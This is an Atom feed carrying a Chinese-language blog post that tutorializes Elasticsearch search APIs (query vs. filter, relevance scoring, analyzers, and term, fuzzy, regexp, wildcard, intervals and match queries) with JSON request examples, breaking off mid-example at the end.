<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Richard Xin&#39;s Blog</title>
  
  <subtitle>Quick notes</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xinlichao.cn/"/>
  <updated>2021-02-26T10:23:44.670Z</updated>
  <id>https://xinlichao.cn/</id>
  
  <author>
    <name>Richard</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>重学 Elastic Stack 之 Elasticsearch 搜索API大全</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-10/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-10/</id>
    <published>2021-02-17T15:45:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>Elasticsearch 搜索 API 整理。</p><a id="more"></a><h2 id="query-和-filter-区别"><a href="#query-和-filter-区别" class="headerlink" title="query 和 filter 区别"></a>query 和 filter 区别</h2><p>在正式进入到搜索部分之前，我们需要区分 <code>query</code>（查询）和 <code>filter</code>（过滤）的区别。</p><p>在进行 <code>query</code> 的时候，除了完成匹配的过程，我们实际上在问“这个结果到底有多匹配我们的搜索关键词”。在所有的返回结果的后面都会有一个 <code>_score</code> 字段表示这个结果的匹配程度，也就是<strong>相关性</strong>。相关性越高的结果就越排在前面，相关性越低就越靠后。当两个文档的相关性相同的时候，会根据 lucene 内部的 <code>doc_id</code> 字段来排序，这个字段对于用户是不可见的也不能控制。</p><p>而在进行 <strong>filter</strong> 的时候，仅仅是在问“这个文档符不符合要求”，这仅仅是一个过滤的操作判断文档是否满足我们的筛选要求，不会计算任何的相关性。比如 <code>timestamp</code> 的范围是否在2019和2020之间，<code>status</code> 状态是否是 1 等等。</p><p>在一个查询语句里面可以同时存在 <code>query</code> 和 <code>filter</code>，只不过只有 <code>query</code> 的查询字段会进行相关性 <code>_score</code> 的计算，而 <code>filter</code> 仅仅用来筛选。比如在下面的查询语句里面，只有 <code>title</code> 字段会进行相关性的计算，而下面的 <code>status</code> 只是为了筛选并不会计算相关性。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must"</span>: [</span><br><span class="line">        &#123;<span class="attr">"match"</span>: &#123;<span class="attr">"title"</span>: <span class="string">"Search"</span>&#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"filter"</span>: [</span><br><span class="line">        &#123;<span class="attr">"term"</span>: &#123;<span class="attr">"state"</span>: <span class="number">1</span>&#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于在实际应用中应该用 <code>query</code> 还是用 <code>filter</code> 需要根据实际的业务场景来看。如果你的产品的搜索只是需要筛选得到最后的搜索结果并不需要 Elasticsearch 的相关性排序（你可能自定义了其他的排序规则），那么使用 <code>filter</code> 就完全能够满足要求并且能够有更好的性能（filter 不需要计算相关性而且会缓存结果）；如果需要考虑文档和搜索词的相关性，那么使用 <code>query</code> 就是最好的选择。</p><h2 id="相关性"><a href="#相关性" class="headerlink" title="相关性"></a>相关性</h2><p>Elasticsearch 的相似度计算主要是利用了全文检索领域的计算标准—— <strong>TF/IDF</strong>（Term Frequency/Inverted Document Frequency）也就是<strong>检索词频率</strong>和<strong>反向文档频率</strong></p><ol><li><strong>TF</strong>（检索词频率）：检索词在这个字段里面出现的频率越高，相关性越高。比如搜索词出现5次肯定比出现1次的文档相关性更高。</li><li><strong>IDF</strong>（反向文档频率）：包含检索词的文档的频率越高，这个检索词的相关性比重越低。如果一个检索词在所有的文档里面都出现了，比如中文的 <code>的</code>，那么这个检索词肯定就不重要，相对应的根据这个检索词匹配的文档的相关性权重应该下降。</li><li><strong>字段长度</strong>：注意这个字段是文档的里面被搜索的字段，不是检索词。如果这个字段的长度越长，相关性就越低。这个主要是因为这个检索词在字段内的重要性降低了，文档就相对来说不那么匹配了。</li></ol><p>在复合查询里面，比如 <code>bool</code> 查询，每个子查询计算出来的评分会根据特定的公式合并到综合评分里面，最后根据这个综合评分来排序。当我们想要修改不同的查询语句的在综合评分里面的比重的时候，可以在查询字段里面添加 <code>boost</code> 参数，这个值是相对于 1 来说的。如果大于 1 则这个查询参数的权重会提高；如果小于 1 ，权重就下降。</p><p>这个评分系统一般是系统默认的，我们可以根据需要定制化我们自己的相关性计算方法，比如通过脚本自定义评分。</p><h2 id="分析器"><a href="#分析器" class="headerlink" title="分析器"></a>分析器</h2><p>分析器是针对 <code>text</code> 字段进行文本分析的工具。文本分析是把非结构化的数据（比如产品描述或者邮件内容）转化成结构化的格式从而提高搜索效率的过程，通常在搜索引擎里面应用的比较多。</p><p><code>text</code> 格式的数据和 <code>keyword</code> 格式的数据在存储和索引的时候差别比较大。<code>keyword</code> 会直接被当成整个字符串保存在文档里面，而 <code>text</code> 格式数据，需要经过分析器解析之后，转化成结构化的文档再保存起来。比如对于 <code>the quick fox</code> 字符串，如果使用 <code>keyword</code> 类型，保存直接就是 <code>the quick fox</code>，使用 <code>the quick fox</code> 作为关键词可以直接匹配，但是使用 <code>the</code> 或者 <code>quick</code> 就不能匹配；但是如果使用 <code>text</code> 保存，那么分析器会把这句话解析成 <code>the</code>、<code>quick</code>、<code>fox</code> 三个 <code>token</code> 进行保存，使用 <code>the quick fox</code> 就无法匹配，但是单独用 <code>the</code>、<code>quick</code>、<code>fox</code> 三个字符串就可以匹配。所以对于<code>text</code> 类型的数据的搜索需要格外注意，如果你的搜索词得不到想要的结果，很有可能是你的搜索语句有问题。</p><p>分析器的工作过程大概分成两步：</p><ol><li><strong>分词</strong>（Tokenization）：根据<strong>停止词</strong>把文本分割成很多的小的 token，比如 <code>the quick fox</code> 会被分成 <code>the</code>、<code>quick</code>、<code>fox</code>，其中的停止词就是空格，还有很多其他的停止词比如&amp;或者#，大多数的标点符号都是停止词</li><li><strong>归一化</strong>（Normalization）：把分隔的token变成统一的形式方便匹配，比如下面几种<ul><li>把单词变成小写，<code>Quick</code> 会变成 <code>quick</code></li><li>提取词干，<code>foxes</code> 变成 <code>fox</code></li><li>合并同义词，<code>jump</code> 和 <code>leap</code> 是同义词，会被统一索引成 <code>jump</code></li></ul></li></ol><p>Elasticsearch 自带了一个分析器，是系统默认的标准分析器，使用标准分词器，大多数情况下都能够有不错的分析效果。用户也可以定义自己的分析器，用于满足不同的业务需求。</p><p>想要知道某个解析器的分析结果，可以直接在ES里面进行分析，执行下面的语句就行了：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /_analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"standard"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"1 Fire's foxes"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回结果</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokens"</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"1"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">0</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"&lt;NUM&gt;"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"fire's"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">2</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">8</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"&lt;ALPHANUM&gt;"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"token"</span> : <span class="string">"fox"</span>,</span><br><span class="line">      <span class="attr">"start_offset"</span> : <span class="number">9</span>,</span><br><span class="line">      <span class="attr">"end_offset"</span> : <span class="number">12</span>,</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"&lt;ALPHANUM&gt;"</span>,</span><br><span class="line">      <span class="attr">"position"</span> : <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回的 <code>tokens</code> 内部就是所有的解析结果，<code>token</code> 表示解析的词语部分，<code>start_offset</code> 和<code>end_offset</code> 分别表示 <code>token</code> 在原 <code>text</code> 内的起始和终止位置，<code>type</code> 表示类型，<code>position</code> 表示这个 token 在整个 tokens 列表里面的位置。</p><p>OK！有了上面的基础知识，就可以进行下面的搜索的介绍了。</p><h2 id="term-搜索"><a href="#term-搜索" class="headerlink" title="term 搜索"></a>term 搜索</h2><p>term 搜索不仅仅可以对 <code>keyword</code> 类型的字段使用，也可以对 <code>text</code> 类型的数据使用，前提是使用的搜索词必须要预先处理一下——不包含停止词并且都是小写（标准解析器），因为文档里面保存的 <code>text</code> 字段分词后的结果，用 <code>term</code> 是可以匹配的。</p><h2 id="term-搜索-exists"><a href="#term-搜索-exists" class="headerlink" title="term 搜索 - exists"></a>term 搜索 - exists</h2><p>返回所有指定字段不为空的文档，比如这个字段对应的值是 <code>null</code> 或者 <code>[]</code> 或者没有为这个字段建立索引。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"exists"</span>: &#123;</span><br><span class="line">      <span class="attr">"field"</span>: <span class="string">"user"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果字段是空字符串 <code>&quot;&quot;</code> 或者包含 <code>null</code> 的数组 <code>[null,&quot;foo&quot;]</code>，都会被当作字段存在。</p><p>这个方法可以用来搜索没有被索引的值或者不存在的值。</p><h2 id="term-搜索-fuzzy"><a href="#term-搜索-fuzzy" class="headerlink" title="term 搜索 - fuzzy"></a>term 搜索 - fuzzy</h2><p>fuzzy 查询是一种模糊查询，会根据检索词和检索字段的<strong>编辑距离</strong>（Levenshtein Distance）来判断是否匹配。一个编辑距离就是对单词进行一个字符的修改，这种修改可能是</p><ul><li>修改一个字符，比如 <code>box</code> 到 <code>fox</code></li><li>删除一个字符，比如 <code>black</code> 到 <code>lack</code></li><li>插入一个字符，比如 <code>sic</code> 到 <code>sick</code></li><li>交换两个相邻的字符的位置，比如 <code>act</code> 到 <code>cat</code></li></ul><p>在进行 fuzzy 搜索的时候，ES 会生成一系列的在特定编辑距离内的变形，然后返回这些变形的准确匹配。默认情况下，当检索词的长度在 <code>0..2</code> 中间时，必须准确匹配；长度在 <code>3..5</code> 之间的时候，编辑距离最大为 <code>1</code>；长度大于 <code>5</code> 的时候，最多允许编辑距离为 <code>2</code>。</p><p>可以通过配置 <code>fuzziness</code> 修改最大编辑距离，<code>max_expansions</code> 修改最多的变形的 <code>token</code> 的数量</p><p>比如搜索是以下条件的时候：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"fuzzy"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"Accha"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回结果有 <code>Iccha</code>、<code>AccHa</code>、<code>accha</code> 还有 <code>ccha</code></p><h2 id="term-搜索-ids"><a href="#term-搜索-ids" class="headerlink" title="term 搜索 - ids"></a>term 搜索 - ids</h2><p>根据文档的 <code>_id</code> 数组返回对应的文档信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"ids"</span>: &#123;</span><br><span class="line">      <span class="attr">"values"</span>: [<span class="string">"1"</span>,<span class="string">"4"</span>,<span class="string">"100"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="term-搜索-prefix"><a href="#term-搜索-prefix" class="headerlink" title="term 搜索 - prefix"></a>term 搜索 - prefix</h2><p>返回所有包含以检索词为前缀的字段的文档。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"prefix"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"ac"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回所有以 <code>ac</code> 开头的字段，比如 <code>acchu</code>、<code>achu</code>、<code>achar</code> 等等</p><p>在某些场景下面比如搜索框里面，需要用户在输入内容的同时也要实时展示与输入内容前缀匹配的搜索结果，就可以使用 prefix 查询。为了加速 prefix 查询，还可以在设置字段映射的时候，使用 <code>index_prefixes</code> 映射。ES 会额外建立一个长度在 2 和 5 之间索引，在进行前缀匹配的时候效率会有很大的提高。</p><h2 id="term-搜索-range"><a href="#term-搜索-range" class="headerlink" title="term 搜索 - range"></a>term 搜索 - range</h2><p>对字段进行范围的匹配。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"range"</span>: &#123;</span><br><span class="line">      <span class="attr">"age"</span>: &#123;</span><br><span class="line">        <span class="attr">"gte"</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="attr">"lte"</span>: <span class="number">20</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索年龄在10（包含）和20（包含）之间的结果</p><h2 id="term-搜索-regexp"><a href="#term-搜索-regexp" class="headerlink" title="term 搜索 - regexp"></a>term 搜索 - regexp</h2><p>正则表达式匹配。通过正则表达式来寻找匹配的字段，<code>lucene</code> 会在搜索的时候生成<strong>有限状态机</strong>，其中包含很多的<strong>状态</strong>，默认的最多状态数量是 10000</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"regexp"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"ac.*ha"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个搜索会匹配 <code>achha</code>、<code>achintha</code> 还有 <code>achutha</code></p><h2 id="term-搜索-term"><a href="#term-搜索-term" class="headerlink" title="term 搜索 - term"></a>term 搜索 - term</h2><p>根据检索词来准确匹配字段。官方文档建议不要用 <code>term</code> 去搜索 <code>text</code> 类型的字段，因为分析器的原因很有可能不会出现你想要的结果。但是直接使用 <code>term</code> 去搜索 <code>text</code> 字段还是可以工作的，前提是明白为什么会返回这些数据。比如通过下面的搜索：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="string">"accha"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>name</code> 字段是 <code>keyword</code> 类型的，没有进行解析，那么只会匹配所有 <code>name</code> 是 <code>accha</code> 的文档。</p><p>如果 <code>name</code> 字段是 <code>text</code> 类型的，原字段经过分词、小写化处理之后，只能匹配到解析之后的单独 <code>token</code>，比如使用标准解析器，这个搜索会匹配 <code>Accha Baccha</code>、<code>so cute accha baccha</code> 或者<code>Accha Baccha Shivam</code> 等字段。</p><h2 id="term-搜索-terms"><a href="#term-搜索-terms" class="headerlink" title="term 搜索 - terms"></a>term 搜索 - terms</h2><p>根据检索词列表来批量搜索文档，每个检索词在搜索的时候相当于 <code>or</code> 的关系，只要一个匹配就行了。Elasticsearch 最多允许 <code>65536</code> 个 <code>term</code> 同时查询。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"terms"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: [</span><br><span class="line">        <span class="string">"accha"</span>,</span><br><span class="line">        <span class="string">"ghazali"</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的查询会匹配 <code>name</code> 字段为 <code>accha</code> 和 <code>ghazali</code> 的文档。</p><p>除了直接指定查询的 term 列表，还可以使用 <code>Terms lookUp</code> 功能，也就是指定某一个存在的文档的某一个字段（可能是数字、字符串或者列表）来作为搜索条件，进行 terms 搜索。</p><p>比如有一个文件 <code>index</code> 是 <code>my_doc</code>，<code>id</code> 是 <code>10</code>，<code>name</code> 字段是 <code>term</code> 并且值为 <code>accha</code>，搜索可以这样写：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"terms"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"index"</span>: <span class="string">"my_doc"</span>,</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"10"</span>,</span><br><span class="line">        <span class="attr">"path"</span>: <span class="string">"name"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以返回所有 <code>name</code> 字段值是 <code>accha</code> 的文档里，这个通常可以用来查询所有和某个文档某个字段重复的文档并且不需要提前知道这个字段的值是什么。</p><h2 id="term-搜索-terms-set"><a href="#term-搜索-terms-set" class="headerlink" title="term 搜索 - terms_set"></a>term 搜索 - terms_set</h2><p><code>terms_set</code> 和 <code>terms</code> 十分类似，只不过是多了一个最少需要匹配数量 <code>minimum_should_match_field</code> 参数。当进行匹配的时候，只有至少包含了这么多的 <code>terms</code> 中的 <code>term</code> 的时候，才会返回对应的结果。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"terms_set"</span>: &#123;</span><br><span class="line">      <span class="attr">"programming_languages"</span>: &#123;</span><br><span class="line">        <span class="attr">"terms"</span>: [<span class="string">"c++"</span>,<span class="string">"java"</span>,<span class="string">"php"</span>],</span><br><span class="line">        <span class="attr">"minimum_should_match_field"</span>: <span class="string">"required_match"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>:<span class="string">"Jane Smith"</span>,</span><br><span class="line">    <span class="attr">"programming_languages"</span>:[</span><br><span class="line">        <span class="string">"c++"</span>,</span><br><span class="line">        <span class="string">"java"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"required_matches"</span>:<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么只有 <code>programming_languages</code> 列表里面至少包含 <code>[&quot;c++&quot;, &quot;java&quot;, &quot;php&quot;]</code> 其中的 2 项才能满足条件</p><p>还可以使用 <code>minimum_should_match_script</code> 脚本来配置动态查询</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"terms_set"</span>: &#123;</span><br><span class="line">      <span class="attr">"programming_languages"</span>: &#123;</span><br><span class="line">        <span class="attr">"terms"</span>: [<span class="string">"c++"</span>,<span class="string">"java"</span>,<span class="string">"php"</span>],</span><br><span class="line">        <span class="attr">"minimum_should_match_script"</span>: &#123;</span><br><span class="line">          <span class="attr">"source"</span>: <span class="string">"Math.min(params.num_terms, doc['required_matches'].value)"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>params.num_terms</code> 是在 <code>terms</code> 字段中的元素的个数</p><h2 id="term-搜索-wildcard"><a href="#term-搜索-wildcard" class="headerlink" title="term 搜索 - wildcard"></a>term 搜索 - wildcard</h2><p>通配符匹配，返回匹配包含通配符的检索词的结果。</p><p>目前只支持两种通配符：</p><ul><li><code>?</code>：匹配任何单一的字符</li><li><code>*</code>：匹配 0 个或者多个字符</li></ul><p>在进行 <code>wildcard</code> 搜索的时候最好避免在检索词的开头使用 <code>*</code> 或者 <code>?</code>，这会降低搜索性能。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"wildcard"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="string">"acc*"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个搜索会匹配 <code>acchu</code>、<code>acche</code> 或者 <code>accio</code> 父</p><h2 id="text-搜索"><a href="#text-搜索" class="headerlink" title="text 搜索"></a>text 搜索</h2><p><code>text</code> 搜索实际上是针对被定义为 <code>text</code> 类型的字段的搜索，通常搜索的时候不能根据输入的字符串的整体来理解，而是要预先处理一下，把搜索词变成小的 token，再来查看每个 token 的匹配。</p><h2 id="text-搜索-interval"><a href="#text-搜索-interval" class="headerlink" title="text 搜索 - interval"></a>text 搜索 - interval</h2><p>返回按照检索词的特定排列顺序排列的文档。这个查询比较复杂，这里只是简单的介绍，详细的介绍可以看<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-intervals-query.html" target="_blank" rel="noopener">官方文档</a></p><p>比如我们想查询同时包含 <code>raj</code> 和 <code>nayaka</code> 的字段并且 <code>ray</code> 正好在 <code>nayaka</code> 前面，查询语句如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"intervals"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: &#123;</span><br><span class="line">        <span class="attr">"match"</span>: &#123;</span><br><span class="line">          <span class="attr">"query"</span>: <span class="string">"raj nayaka"</span>,</span><br><span class="line">          <span class="attr">"max_gaps"</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">"ordered"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的查询会匹配 <code>Raj Nayaka Acchu Valmiki</code> 和 <code>Yateesh Raj Nayaka</code>。</p><p>如果把 <code>ordered:true</code> 去掉，就会匹配 <code>nayaka raj</code>。</p><p>如果把 <code>max_gaps:0</code> 去掉，系统会用默认值 <code>-1</code> 也就是没有距离要求，就会匹配 <code>Raj Raja nayaka</code> 或者 <code>Raj Kumar Nayaka</code></p><p>其中有两个关键词 <code>ordered</code> 和 <code>max_gaps</code> 分别用来控制这个筛选条件是否需要排序以及两个 <code>token</code> 之间的最大间隔</p><h2 id="text-搜索-match"><a href="#text-搜索-match" class="headerlink" title="text 搜索 - match"></a>text 搜索 - match</h2><p>查找和检索词短语匹配的文档，这些检索词在进行搜索之前会先被分析器解析，检索词可以是文本、数字、日期或者布尔值。match 检索也可以进行模糊匹配。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"nagesh acchu"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 